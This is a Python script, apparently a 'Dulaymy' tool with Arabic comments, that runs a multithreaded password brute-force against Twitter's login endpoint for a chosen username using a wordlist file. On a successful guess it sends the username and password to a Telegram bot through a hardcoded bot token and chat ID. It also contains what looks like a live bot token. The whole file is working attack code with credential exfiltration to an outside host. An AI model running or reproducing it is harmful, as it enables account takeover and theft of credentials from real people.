import os
import requests
import random 
import threading
import pyfiglet




# = = = = = = = = = = = = 

R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
G= '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح

# = = = = = = = = = = = =
logo = pyfiglet.figlet_format('Dulaymy')
print(B+logo)
print(R+'* '*15+A)


Words = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm']
token = (random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words))
ct0 = ''
auth_token = ''
tweets = open('pass.txt', 'r')

#numf= len(open('pass.txt', 'r').read().split('\n'))

	
username = input(str("Enter username : "))
threa= int(input(str("Enter Threading 1 : ")))

#password = input(str("Enter password : "))


		

ID =5046952858 # input('• ايدي  : ')
token ='5366139923:AAHpR63XiZmYUGaN0pdONyHYAvNJqze4QlA' # input('• توكن  : ')

def login():
	password = tweets.readline().split('\n')[0]
	session = requests.Session()
	url = "https://twitter.com/sessions"
	session.headers = {
	"Host": "twitter.com",
	"Content-Type": "application/x-www-form-urlencoded",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
	}
	cookies = {
	"_mb_tk":token
	}
	data = {
	"authenticity_token":token,
	"session[username_or_email]":username,
	"session[password]":password
	}
	response = session.post(url, data=data , cookies=cookies)
	r = session.cookies.get_dict()
	try:
		if(r['dnt']):
			print(Y+"Password is : "+G+password)
			req=requests.session()
			tlg =(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 
Username : {username}
Password : {password} 
''')
			i = req.post(tlg)

			os._exit(0)
	except:
		print(R+password)
while True:
	threads = []
	for i in range(threa):
		thread1= threading.Thread(target=login,args=())
		thread1.start()
		threads.append(thread1)
	for thread2 in threads:
		thread2.join()
		